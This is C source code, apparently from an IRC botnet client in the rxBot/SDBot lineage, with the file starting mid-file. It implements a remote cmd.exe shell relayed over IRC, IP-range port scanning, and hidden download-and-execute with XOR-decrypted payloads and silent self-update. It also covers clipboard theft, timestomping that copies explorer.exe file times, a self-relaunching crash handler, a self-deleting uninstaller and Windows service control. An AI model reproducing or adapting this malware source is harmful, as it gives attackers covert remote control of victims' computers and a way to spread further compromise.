FILE *gfp;
#endif

char log[LOGSIZE][LOGLINE];

int addalias(char *name, char *command)
{
	int i;
	for (i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
}

void aliaslist(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "AlIaS lIsT", notice);
	for (int i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] != '\0') {
			_snprintf(buffer, sizeof(buffer),"%d. %s = %s", i, aliases[i].name, aliases[i].command);
			irc_privmsg(sock, chan, buffer, notice,TRUE);
		}
	}

	return;
}

void addlog(char *desc)
{
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (register int i = LOGSIZE; i >= 0; i--) 
		if (log[i][0] != '\0') 
			strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	_snprintf(log[0], sizeof(log[0]), "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);

	return;
}

void addlogv(char *desc, ...)
{
	char logbuf[LOGLINE];

	va_list argp;
	va_start(argp, desc); 
	_vsnprintf(logbuf, sizeof(logbuf), desc, argp);

	addlog(logbuf);
	
	return;
}

void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter)
{
	int entries = LOGSIZE, tmp = 0;

	if (!silent) irc_privmsg(sock, chan, "-[Logs]-", notice);

	if (filter) {
		if ((tmp = atoi(filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (!filter || tmp != 0)
				irc_privmsg(sock, chan, log[i], notice, TRUE);
			else if (lstrstr(log[i], filter))
				irc_privmsg(sock, chan, log[i], notice, TRUE);
		}
	
	return;
}

void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	for (register int i = 0;i < LOGSIZE; log[i++][0] = '\0');
	if (!silent) irc_privmsg(sock, chan, "Cleared", notice);
	addlog("[LOGS]: Cleared.");

	return;
}

BOOL searchlog(char *filter)
{
	for (int i = 0; i < LOGSIZE; i++) 
		if (log[i][0] != '\0') {
			if (lstrstr(log[i], filter))
				return TRUE;
		}
	
	return FALSE;
}

DWORD WINAPI ShowLogThread(LPVOID param) 
{
	char sendbuf[IRCLINE];
	int entries = LOGSIZE, tmp = 0;

	SHOWLOG showlog = *((SHOWLOG *)param);
	SHOWLOG *showlogp = (SHOWLOG *)param;
	showlogp->gotinfo = TRUE;

	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,"Begin",showlog.notice);

	if (showlog.filter[0] != '\0') {
		if ((tmp = atoi(showlog.filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (showlog.filter[0] == '\0' || tmp != 0)
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
			else if (lstrstr(log[i], showlog.filter))
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
		}
	
	sprintf(sendbuf,"%s List complete.",mn_title);
	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,sendbuf,showlog.notice);
	addlog(sendbuf);

	clearthread(showlog.threadnum);

	ExitThread(0);
}

#ifdef DEBUG_LOGGING
void opendebuglog(void)
{
	gfp = fopen(logfile, "ab");

	return;
}

void debuglog(char *buffer, BOOL crlf)
{
	if (gfp != NULL) {
		if (crlf)
			fprintf(gfp,"%s\r\n",buffer);
		else
			fprintf(gfp,"%s",buffer);
		fflush(gfp);
	}

	return;
}

void closedebuglog(void)
{
	fclose(gfp);

	return;
}
#endif

#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	switch(dwCtrlType) {
	case CTRL_C_EVENT:
	case CTRL_BREAK_EVENT:
	case CTRL_CLOSE_EVENT:
		return TRUE;
	}
 
	return FALSE;
}

void OpenConsole(void)
{
	AllocConsole();
 
	int hCrt = _open_osfhandle((long)GetStdHandle(STD_OUTPUT_HANDLE),_O_TEXT);
	FILE *hf = _fdopen(hCrt,"w");
	*stdout = *hf;
	int i = setvbuf(stdout,NULL,_IONBF,0); 

	hCrt = _open_osfhandle((long)GetStdHandle(STD_ERROR_HANDLE),_O_TEXT);
	hf = _fdopen(hCrt,"w");
	*stderr = *hf;
	i = setvbuf(stdout,NULL,_IONBF,0); 
 
	SetConsoleCtrlHandler(HandlerRoutine, true);

	return;
}
#endif

#ifndef NO_SCAN

// checks ip for open port
DWORD WINAPI ScanConnectThread(LPVOID param)
{
	static char sendbuf[IRCLINE];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->cgotinfo = TRUE;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)scan.port);
	ssin.sin_addr = scan.addy;

	SOCKET sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock != INVALID_SOCKET) {
		DWORD err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		threads[scan.threadnum].sock = sock;
		if (err != SOCKET_ERROR) {
			sprintf(sendbuf,"%s IP: %s Port: %d is open", sc_title,finet_ntoa(scan.addy), scan.port);
			irc_privmsg(scan.sock, scan.chan, sendbuf, scan.notice);
			addlog(sendbuf);
		}
	} 
	fclosesocket(sock);

	return 0;
}

// scan a range of IPs for an open port
DWORD WINAPI ScanThread(LPVOID param)
{
	DWORD id, host;
	HANDLE th;
	char str[128];

	SCAN scan = *((SCAN *)param);
	SCAN *scans = (SCAN *)param;
	scans->gotinfo = TRUE;

	while(1) {
		sprintf(str, "IP: %s Port: %d", sc_title, finet_ntoa(scan.addy), scan.port);
		strncpy(threads[scan.threadnum].name, str, sizeof(threads[scan.threadnum].name)-1);
		if (th = CreateThread(NULL, 0, &ScanConnectThread, (LPVOID)&scan, 0, &id)) {
			while(scan.cgotinfo == FALSE)
				Sleep(50);
		}
		CloseHandle(th);
		scans->cgotinfo = FALSE;
		Sleep(scans->delay);
		memcpy(&host, &scan.addy, 4);
		host = fntohl(host);
		host += 1;
		host = fhtonl(host);
		memcpy(&scan.addy, &host, 4);
	}
	clearthread(scan.threadnum);

	return 0;
 }
#endif

#ifndef NO_DOWNLOAD

// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	DOWNLOAD dl = *((DOWNLOAD *)param);
	DOWNLOAD *dls = (DOWNLOAD *)param;
	dls->gotinfo = TRUE;

	HANDLE fh = fInternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
	if (fh != NULL) {
		// open the file
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			sprintf(buffer,"%s Couldn't open file: %s",mn_title,dl.dest);
			if (!dl.silent) irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
			addlog(buffer);

			clearthread(dl.threadnum);

			ExitThread(0);;
		}

		total = 0;
		start = GetTickCount();

		char *fileTotBuff=(char *)malloc(512000);	//FIX ME: Only checks first 500 kb
		do {
			memset(buffer, 0, sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			if (dl.encrypted)
				Xorbuff(buffer,r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000) {
				//We have free bytes...
				//512000-total
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
			if (dl.filelen) 
				if (total>dl.filelen) 
					break; //er, we have a problem... filesize is too big.
			if (dl.update != 1) 
				sprintf(threads[dl.threadnum].name, "%s File download: %s (%dKB transferred)", mn_title, dl.url, total / 1024);
			else 
				sprintf(threads[dl.threadnum].name, "%s Update: %s (%dKB transferred)", dl.url, total / 1024);
		} while (r > 0);

		BOOL goodfile=TRUE;

		if (dl.filelen) {
			if (total!=dl.filelen) {
				goodfile=FALSE;
				sprintf(buffer,"%s Filesize is incorrect: (%d != %d).", mn_title, total, dl.filelen);
				irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
				addlog(buffer);
			}
		}
		speed = total / (((GetTickCount() - start) / 1000) + 1);
		CloseHandle(f);

		free(fileTotBuff);
		
		if (dl.expectedcrc) { 
			unsigned long crc=crc32f(dl.dest); 
			if (crc!=dl.expectedcrc) { 
				goodfile=FALSE;
				sprintf(buffer,"%s CRC Failed (%d != %d)", mn_title, crc, dl.expectedcrc);
				irc_privmsg(dl.sock, dl.chan, buffer, dl.notice); 
				addlog(buffer);
			} 
		} 

		if (goodfile==FALSE) 
			goto badfile;
		
		//download isn't an update
		if (dl.update != 1) {
			sprintf(buffer, "%s Downloaded %.1f KB to %s @ %.1f KB/sec.", mn_title, total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			if (dl.run == 1) {
				fShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
				if (!dl.silent) {
					sprintf(buffer,"%s Opened: %s ",mn_title,dl.dest);
					irc_privmsg(dl.sock,dl.chan,buffer,dl.notice);
					addlog(buffer);
				}
			}

		// download is an update
		} else {
			sprintf(buffer, "%s Downloaded %.1fKB to %s @ %.1fKB/sec. Updating", mn_title, total / 1024.0, dl.dest, speed / 1024.0);
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
			addlog(buffer);

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, dl.dest, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else {
				sprintf(buffer,"%s Update failed: Error executing file: %s",mn_title, dl.dest);
				if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
				addlog(buffer);
			}
		}
	} else {
		sprintf(buffer,"%s Bad URL, or DNS Error: %s",mn_title, dl.url);
		if (!dl.silent) irc_privmsg(dl.sock, dl.chan, buffer, dl.notice);
		addlog(buffer);
	}

	badfile:
	fInternetCloseHandle(fh);

	clearthread(dl.threadnum);

	ExitThread(0);
}

char *Xorbuff(char *buffer,int bufferLen)
{
	for (int i=0;i<bufferLen;i++)
		buffer[i]^=prefix;

	return (buffer);
}
#endif

// globals
extern char tempdir[256];      // name of temp folder

char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

// This will change x0A & x0D into x00 and return line pointers in saveArray[].
int Split(char *inStr, void *saveArray)
{
	int i,j,index=0;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;

	lines[index++]=inStr;
	for (i=0;i < j;i++) 
		if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) 
			inStr[i]='\x0';

	//Now that all cr/lf have been converted to NULL, save the pointers...
	for (i=0;i < j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			if (index < MAX_LINES) 
				lines[index++] = &inStr[i+1]; 
			else 
				break;
		}
	}

	if (saveArray!=0) 
		memcpy(saveArray,lines,sizeof(lines));

	return index;
}

void initskip(char *s, int len, int skip[1024])
{
	int i, j;

	for (i = 0; i < MAXSTRLEN; i++)
		skip[i] = len;
	for (j = 0; j <= len - 1; j++)
		skip[lstrindex(s[j])] = len - j - 1;

	return;
}

int lstrindex(char c)
{
	char d = tolower(c);

	if (d >= 'a' && d <= 'z')
		return (d - 'a' + 1);
	else
		return 0;
}

char *lstrstr(char *s, char *t)
{
	int i, j, k, slen=strlen(s), tlen=strlen(t);
	int skip[1024];

	initskip(t, tlen, skip);

	for (i = j = tlen - 1; j > 0; i--, j--) {
		while (tolower(s[i]) != tolower(t[j])) {
			k = skip[lstrindex(s[i])];
			i += (tlen - j > k) ? tlen - j : k;
			if (i >= slen)
				return NULL;
			j = tlen - 1;
		}
	}
	return (s + i);
}

char *PrintError(char *msg)
{
	TCHAR sysMsg[256];
	static char buffer[IRCLINE];

	DWORD err = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysMsg, 256, NULL);

	TCHAR *p = sysMsg;
	while((*p > 31) || (*p == 9))
		++p;
	do
		*p-- = 0; 
	while((p >= sysMsg) && ((*p == '.') || (*p < 33)));

	_snprintf(buffer,sizeof(buffer),"%s Error: %s <%d>.",msg,sysMsg,err);

	return (buffer);
}

char *GetClipboardText(void) 
{
	if (fOpenClipboard(NULL)) {
		HANDLE hData = fGetClipboardData(CF_TEXT);
		if (!hData) 
			return 0;
		char * buffer = (char*)GlobalLock(hData);

		GlobalUnlock(hData);
		fCloseClipboard();

		return buffer;
	}

	return 0;
}

BOOL mirccmd(char *cmd)
{
	HWND mwnd = fFindWindow("mIRC",NULL);
	if (mwnd) {
		HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
		LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
		sprintf(mData, cmd);
		fSendMessage(mwnd,WM_USER + 200,1,0);
		fSendMessage(mwnd,WM_USER + 201,1,0);
		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

		return TRUE;
	 }
	else
		return FALSE;
}

void SetFileTime(char *Filename)
{
	FILETIME aFileTime, bFileTime, cFileTime;

	char exepath[MAX_PATH];
	if(fSearchPath(NULL,"explorer.exe",NULL,sizeof(exepath),exepath,NULL) == 0)
		return;  

	HANDLE hTimeFile = CreateFile(exepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE) {
			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
	}

	return;
}

DWORD CreateProc(char *file, char *param)
{	
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); 
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;

	char cmdline[1024];
	_snprintf(cmdline,sizeof(cmdline),"%s %s",file, param);

	if (CreateProcess(file, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == 0)
		return 0; 

	return (pinfo.dwProcessId); 
}

BOOL Reboot(void)
{
	AdjustPrivileges(SE_SHUTDOWN_NAME, TRUE);

	if (!fExitWindowsEx(EWX_SYSTEM_REBOOT /* or EWX_FORCE_SHUTDOWN */, SHUTDOWN_SYSTEM_HUNG))
		return FALSE;

	return TRUE;
}

void uninstall(void)
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs();

	killthreadall();
	
	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
	
	return;
}
int randnum(int range) {
	srand(GetTickCount());
	return (rand() % range);
}

// globals
extern FILE *fp;

// irc send functions
void irc_sendv(SOCKET sock, char *msg, ...)
{
	char msgbuf[IRCLINE];

	va_list argp;
	va_start(argp, msg); 
	_vsnprintf(msgbuf, sizeof(msgbuf), msg, argp);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
#endif

	return;
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay)
{
	char msgbuf[IRCLINE], tmpbuf[IRCLINE], *action;

	if (notice) 
		action = "NOTICE"; 
	else 
		action = "PRIVMSG";

	int bufsize = IRCLINE - strlen(action) - strlen(dest) - 6 ; // trust me
	_snprintf(tmpbuf,bufsize,"%s",msg);
	sprintf(msgbuf,"%s %s :%s\r\n", action, dest, tmpbuf);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
#endif

	if(delay)
		Sleep(FLOOD_DELAY);

	return;
}

#ifndef NO_EHANDLER

// globals
DWORD scratch;

EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
	void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext)
{	

	fclosesocket(threads[0].sock);
	killthreadall();
	fWSACleanup();
	fWSACleanup();
	Sleep(100);
	
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef DEBUG_CONSOLE
	sinfo.wShowWindow = SW_SHOW;
#else
	sinfo.wShowWindow = SW_HIDE;
#endif
		
	char botfile[MAX_PATH],sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	if (CreateProcess(NULL, botfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
		Sleep(100);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}

	ContextRecord->Eax = (DWORD)&scratch;

	_asm
	{                           // Remove our EXECEPTION_REGISTRATION record
		mov     eax,[ESP]       // Get pointer to previous record
		mov     FS:[0], EAX     // Install previous record
		add     esp, 8          // Clean our EXECEPTION_REGISTRATION off stack
	}

	ExitProcess(0);

	return ExceptionContinueExecution;
}
#endif



#ifndef NO_REMOTECMD

HANDLE pipe_read;
HANDLE pipe_write;
HANDLE pipe_Hproc;
HANDLE hChildInWrDupe;
SOCKET pipesock;
char pipe_chan[50]; 

void Close_Handles(void)
{
	if (pipe_read != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_read);
	if (pipe_write != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_write);
	if (pipe_Hproc != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_Hproc);

	return;
}

BOOL send_commands(char *commands)
{ 
	DWORD cmdlen = strlen(commands);
	if (!WriteFile(hChildInWrDupe,commands,cmdlen,&cmdlen,NULL)) {
		Close_Handles(); 
		return FALSE;
	}

	return TRUE;
}

int pipe_send(SOCKET sock,char *chan,char *buf)
{
	char sendbuf[IRCLINE];

	if (strcmp(chan, "") != 0) {
		Sleep(FLOOD_DELAY);
		sprintf(sendbuf,"PRIVMSG %s :%s\r",chan,buf);
	} else 
		sprintf(sendbuf,"%s",buf);

	if (fsend(sock,sendbuf,strlen(sendbuf),0) <= 0) 
		Close_Handles();

	return 0;
}

DWORD WINAPI PipeReadThread(LPVOID param)
{
	DWORD numread, br;
	char buffer[IRCLINE];

	int threadnum = (int)param;

	while (1) {
		BOOL eol = FALSE;
		DWORD State;

		memset(buffer,0,sizeof(buffer));
		if (!PeekNamedPipe(pipe_read,buffer,IRCLINE,&br,NULL,NULL)) {
			pipe_send(pipesock,pipe_chan,"Could not read data from proccess.\r\n");
			clearthread(threadnum);

			ExitThread(1);
		}

		if (br == 0) { //nothing to read 
			if (GetExitCodeProcess(pipe_Hproc,&State)) { 
				if (State != STILL_ACTIVE) {
					Close_Handles(); 
					pipe_send(pipesock,pipe_chan,"Proccess has terminated.\r\n");
					clearthread(threadnum);

					ExitThread (0);
				}
			}
			Sleep(10); //process pause and retry
			continue;
		}

		DWORD cbyte;
		for (cbyte=0;cbyte<br;cbyte++) {
			if (buffer[cbyte] == '\n') {
				eol = TRUE;
				break;
			}
		}
		if (eol) 
			br = cbyte + 1;
		else 
			br = 512;
		memset(buffer,0,sizeof(buffer));
		if (!ReadFile(pipe_read, buffer, br, &numread, NULL)) 
				break;
		pipe_send(pipesock,pipe_chan,buffer);

	}
	pipe_send(pipesock,pipe_chan,"Could not read data from proccess.\r\n");
	clearthread(threadnum);

	ExitThread (0);
}

int open_cmd(SOCKET sock,char * chan)
{
	char buffer[IRCLINE], cmddir[MAX_PATH];
	int threadnum;

	SECURITY_ATTRIBUTES secAttr;
	HANDLE hChildOutRd, hChildOutWr, hChildInRd, hChildInWr;

	Close_Handles();

	if(fSearchPath(NULL,"cmd.exe",NULL,sizeof(cmddir),cmddir,NULL) == 0)
		return -1;  

    secAttr.nLength = sizeof(secAttr);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildOutRd, &hChildOutWr, &secAttr, 0)) 
		return -1;
    if (!CreatePipe(&hChildInRd, &hChildInWr, &secAttr, 0)) 
		return -1;
    if (!DuplicateHandle(GetCurrentProcess(), hChildInWr, GetCurrentProcess(), &hChildInWrDupe, 0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE)) 
		return -1;

  	PROCESS_INFORMATION pinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	STARTUPINFO sinfo;
   	memset(&sinfo, 0, sizeof(sinfo));
   	sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = hChildInRd;
    sinfo.hStdOutput = hChildOutWr;
	sinfo.hStdError = hChildOutWr;
   	if (!CreateProcess(cmddir,"", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) 
		return -1;
   	CloseHandle(hChildInRd);

	DWORD id;
	pipe_read = hChildOutRd;
	pipe_write = hChildInWr;
	pipe_Hproc = pinfo.hProcess;
   	CloseHandle(pinfo.hThread);
	pipesock = sock;

	if (chan) 
		sprintf(pipe_chan,chan);
	else 
		sprintf(pipe_chan,""); 		

	threadnum = addthread("Remote Command Prompt",RCMD_THREAD,NULL);
	threads[threadnum].pid = pinfo.dwProcessId;
	if ((threads[threadnum].tHandle = CreateThread(NULL, 0, &PipeReadThread, (LPVOID)threadnum, 0, &id)) == NULL) {
		sprintf(buffer,"%s Failed to start IO thread, error  %d ", mn_title,GetLastError());
		addlog(buffer);
	}

	return 0;
}
#endif

#ifndef NO_NET
// globals
NetCommand netcommand[]={
	{"Add","Added",0},
	{"Delete","Deleted", 0},
	{"List","Listed", 0},
	{"Start","Started", 0},
	{"Stop","Stopped", SERVICE_CONTROL_STOP},
	{"Pause","Paused", SERVICE_CONTROL_PAUSE},
	{"Continue","Continued", SERVICE_CONTROL_CONTINUE}
};

char *Services(int action, char *ServiceName)
{
	static char buffer[IRCLINE];
	
	if (ServiceName) {
		DWORD svcError = ServiceControl(action, ServiceName, netcommand[action].control);
		if (svcError == 0)
			sprintf(buffer,"%s %s service: '%s'.", mn_title,netcommand[action].completed, ServiceName);
		else
			sprintf(buffer,"%s Error with service: '%s'. %s", mn_title,ServiceName, ServiceError(svcError));
	}
	else 
		sprintf(buffer,"%s %s: No service specified", mn_title,netcommand[action].action);

	return (buffer);
}

DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl, DWORD nArg, LPCTSTR *pArg) 
{ 
	DWORD svcError=0;
	SERVICE_STATUS status;

	SC_HANDLE schSCManager = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager == 0)
		svcError = GetLastError();  
	else {
		SC_HANDLE schService = fOpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
		if (schService == 0) 
			svcError = GetLastError();
		else {
			switch (option) {
			case NET_START:
				if (!fStartService(schService,nArg,pArg))
					svcError = GetLastError();
				break;
			case NET_DELETE:
				if (!fDeleteService(schService))
					svcError = GetLastError();
				break;
			case NET_STOP:
			case NET_PAUSE:
			case NET_CONTINUE:
				if (!fControlService(schService,dwControl,&status))
					svcError = GetLastError();
				break;
			default:
				break;
			}
			fCloseServiceHandle(schService); 
		}
		fCloseServiceHandle(schSCManager); 
	}

	return (svcError);
}

static char *ServiceError(DWORD svcError)
{
	static char retError[90];

	switch (svcError) {
	case ERROR_DATABASE_DOES_NOT_EXIST:
		sprintf(retError,"The specified database does not exist.");
		break;
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"The handle does not have the required access right.");
		break;
	case ERROR_INVALID_NAME: 
		sprintf(retError,"The specified service name is invalid.");
		break;
	case ERROR_INVALID_HANDLE: 
		sprintf(retError,"The handle is invalid.");
		break;
	case ERROR_PATH_NOT_FOUND: 
		sprintf(retError,"The service binary file could not be found.");
		break;
	case ERROR_SERVICE_ALREADY_RUNNING: 
		sprintf(retError,"An instance of the service is already running.");
		break;
	case ERROR_SERVICE_DATABASE_LOCKED: 
		sprintf(retError,"The database is locked.");
		break;
	case ERROR_SERVICE_DEPENDENCY_DELETED: 
		sprintf(retError,"The service depends on a service that does not exist or has been marked for deletion.");
		break;
	case ERROR_SERVICE_DEPENDENCY_FAIL: 
		sprintf(retError,"The service depends on another service that has failed to start.");
		break;
	case ERROR_SERVICE_DISABLED: 
		sprintf(retError,"The service has been disabled.");
		break;
	case ERROR_SERVICE_DOES_NOT_EXIST: 
		sprintf(retError,"The specified service does not exist.");
		break;
	case ERROR_SERVICE_LOGON_FAILED: 
		sprintf(retError,"The service could not be logged on. The account does not have the correct access rights.");
		break;
	case ERROR_SERVICE_MARKED_FOR_DELETE: 
		sprintf(retError,"The service has been marked for deletion.");
		break;
	case ERROR_SERVICE_NO_THREAD: 
		sprintf(retError,"A thread could not be created for the service.");
		break;
	case ERROR_SERVICE_REQUEST_TIMEOUT: 
		sprintf(retError,"The process for the service was started, but it did not call StartServiceCtrlDispatcher."); 
		break;
	case ERROR_DEPENDENT_SERVICES_RUNNING: 
		sprintf(retError,"The service cannot be stopped because other running services are dependent on it.");
		break;
	case ERROR_INVALID_PARAMETER: 
		sprintf(retError,"The requested control code is undefined.");
		break;
	case ERROR_INVALID_SERVICE_CONTROL: 
		sprintf(retError,"The requested control code is not valid, or it is unacceptable to the service."); 
		break;
	case ERROR_SERVICE_CANNOT_ACCEPT_CTRL: 
		sprintf(retError,"The requested control code cannot be sent to the service because the state of the service."); 
		break;
	case ERROR_SERVICE_NOT_ACTIVE: 
		sprintf(retError,"The service has not been started."); 
		break;
	case ERROR_SHUTDOWN_IN_PROGRESS: 
		sprintf(retError,"The system is shutting down."); 
		break;
	default:
		sprintf(retError,"An unknown error occurred: <%ld>", svcError);
	}

	return (retError);

}

BOOL ListServices(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], svcState[20];

